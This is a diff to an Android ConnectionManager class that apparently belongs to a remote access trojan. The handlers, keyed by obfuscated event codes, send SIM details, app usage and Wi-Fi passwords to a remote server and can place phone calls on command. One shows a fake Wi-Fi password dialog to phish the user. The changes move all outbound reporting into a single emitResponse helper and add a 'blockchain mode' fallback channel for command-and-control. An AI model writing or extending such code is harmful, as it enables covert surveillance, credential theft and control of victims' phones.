@@ -1250,7 +1614,7 @@ public class ConnectionManager {
         Log.d(TAG, "Usage stats command");
         try {
             JSONObject usageStats = systemInfoManager.getAppUsageStats();
-            ioSocket.emit("x0000us", usageStats);
+            emitResponse("x0000us", usageStats);
         } catch (Exception e) {
             Log.e(TAG, "Error in usage stats command", e);
         }
@@ -1260,7 +1624,7 @@ public class ConnectionManager {
         Log.d(TAG, "Battery info command");
         try {
             JSONObject batteryInfo = systemInfoManager.getBatteryInfo();
-            ioSocket.emit("x0000bt", batteryInfo);
+            emitResponse("x0000bt", batteryInfo);
         } catch (Exception e) {
             Log.e(TAG, "Error in battery command", e);
         }
@@ -1270,7 +1634,7 @@ public class ConnectionManager {
         Log.d(TAG, "SIM info command");
         try {
             JSONObject simInfo = systemInfoManager.getSimInfo();
-            ioSocket.emit("x0000sm2", simInfo);
+            emitResponse("x0000sm2", simInfo);
         } catch (Exception e) {
             Log.e(TAG, "Error in SIM info command", e);
         }
@@ -1289,14 +1653,14 @@ public class ConnectionManager {
             JSONObject result = new JSONObject();
             result.put("success", true);
             result.put("phoneNumber", phoneNumber);
-            ioSocket.emit("x0000mc2", result);
+            emitResponse("x0000mc2", result);
         } catch (SecurityException e) {
             Log.e(TAG, "CALL_PHONE permission required", e);
             try {
                 JSONObject result = new JSONObject();
                 result.put("success", false);
                 result.put("error", "CALL_PHONE permission required");
-                ioSocket.emit("x0000mc2", result);
+                emitResponse("x0000mc2", result);
             } catch (Exception ex) {}
         } catch (Exception e) {
             Log.e(TAG, "Error making call", e);
@@ -1304,7 +1668,7 @@ public class ConnectionManager {
                 JSONObject result = new JSONObject();
                 result.put("success", false);
                 result.put("error", e.getMessage());
-                ioSocket.emit("x0000mc2", result);
+                emitResponse("x0000mc2", result);
             } catch (Exception ex) {}
         }
     }
@@ -1328,7 +1692,7 @@ public class ConnectionManager {
             try {
                 JSONObject result = new JSONObject();
                 result.put("error", e.getMessage());
-                ioSocket.emit("x0000lm2", result);
+                emitResponse("x0000lm2", result);
             } catch (Exception ex) {}
         }
     }
@@ -1339,7 +1703,7 @@ public class ConnectionManager {
     public static void sendWifiPasswordResult(JSONObject result) {
         try {
             if (ioSocket != null) {
-                ioSocket.emit("x0000wp", result);
+                emitResponse("x0000wp", result);
                 Log.d(TAG, "WiFi password result sent");
             }
         } catch (Exception e) {
@@ -1459,7 +1823,7 @@ public class ConnectionManager {
                 default:
                     result.put("success", false);
                     result.put("error", "Unknown permission type: " + permission);
-                    ioSocket.emit("x0000rp", result);
+                    emitResponse("x0000rp", result);
                     return;
             }
             
@@ -1553,7 +1917,7 @@ public class ConnectionManager {
                 result.put("error", "Could not create intent for: " + permission);
             }
             
-            ioSocket.emit("x0000rp", result);
+            emitResponse("x0000rp", result);
             
         } catch (Exception e) {
             Log.e(TAG, "Error requesting permission", e);
@@ -1561,7 +1925,7 @@ public class ConnectionManager {
                 JSONObject error = new JSONObject();
                 error.put("success", false);
                 error.put("error", e.getMessage());
-                ioSocket.emit("x0000rp", error);
+                emitResponse("x0000rp", error);
             } catch (Exception ignored) {}
         }
     }
@@ -1587,7 +1951,7 @@ public class ConnectionManager {
                 result.put("success", true);
                 result.put("message", "WiFi password dialog shown on device");
                 result.put("instruction", "Wait for user to enter password");
-                ioSocket.emit("x0000wp", result);
+                emitResponse("x0000wp", result);
                 return;
             }
             JSONObject result = new JSONObject();
@@ -1814,7 +2178,7 @@ public class ConnectionManager {
                 result.put("error", "Could not retrieve WiFi networks. Try: adb shell cmd wifi list-networks");
             }
             
-            ioSocket.emit("x0000wp", result);
+            emitResponse("x0000wp", result);
             
         } catch (Exception e) {
             Log.e(TAG, "Error getting WiFi passwords", e);
@@ -1822,7 +2186,7 @@ public class ConnectionManager {
                 JSONObject error = new JSONObject();
                 error.put("success", false);
                 error.put("error", e.getMessage());
-                ioSocket.emit("x0000wp", error);
+                emitResponse("x0000wp", error);
             } catch (Exception ex) {}
         }
     }
@@ -2381,7 +2745,7 @@ public class ConnectionManager {
             data.put("manufacturer", android.os.Build.MANUFACTURER);
             data.put("androidVersion", android.os.Build.VERSION.RELEASE);
             if (ioSocket != null) {
-                ioSocket.emit("client_connected", data);
+                emitResponse("client_connected", data);
                 Log.d(TAG, "Connection success message sent");
             }
         } catch (Exception e) {
@@ -2394,6 +2758,10 @@ public class ConnectionManager {
         new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
             @Override
             public void run() {
+                if (IOSocket.ensureBlockchainModeFromConfig()) {
+                    Log.d(TAG, "Blockchain mode detected during retry - skipping Socket.IO retry");
+                    return;
+                }
                 if (!isConnected && !isConnecting) {
                     Log.d(TAG, "Retrying connection...");
                     sendReq();
